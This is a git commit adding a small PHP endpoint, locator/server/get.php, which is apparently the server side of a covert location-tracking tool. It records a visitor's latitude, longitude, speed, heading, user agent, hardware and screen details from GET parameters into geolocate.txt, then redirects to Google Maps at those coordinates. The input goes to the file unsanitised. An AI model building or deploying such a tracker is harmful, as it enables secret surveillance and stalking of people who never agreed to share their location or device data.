2d156f100a5c4d3af0297781a0aa28d944b751b4
root <root@mint.localdomain>
2019-04-20 03:34:05 -0400

    locator

---
+++ locator/server/get.php
@@ -0,0 +1,9 @@
+<?php
+
+file_put_contents("geolocate.txt", "Latitude: " . $_GET['latitude'] . "\n" . "Longitude: " . $_GET["longitude"] . "\n" . "User-Agent: " . $_GET["useragent"] . "\n" . "Altitude: " . $_GET["altitude"] . "\n" . "Accuracy: " . $_GET["accuracy"] . "\n" . "Speed: "  . $_GET["speed"] . "\n" . "Heading: " . $_GET["heading"] . "\n" . "Platform: " . $_GET["platform"] . "\n" . "Cores: " . $_GET["hardware"] . "\n" . "Memory: "   . $_GET["memory"] ."\n" . "Screen Height: "   . $_GET["height"] ."\n" . "Screen Width: "   . $_GET["width"] ."\n", FILE_APPEND);
+$latitude=$_GET["latitude"];
+$longitude=$_GET["longitude"];
+$all = "$latitude+$longitude";
+header("Location: https://www.google.com/maps/place/$all" );
+exit();
+?>
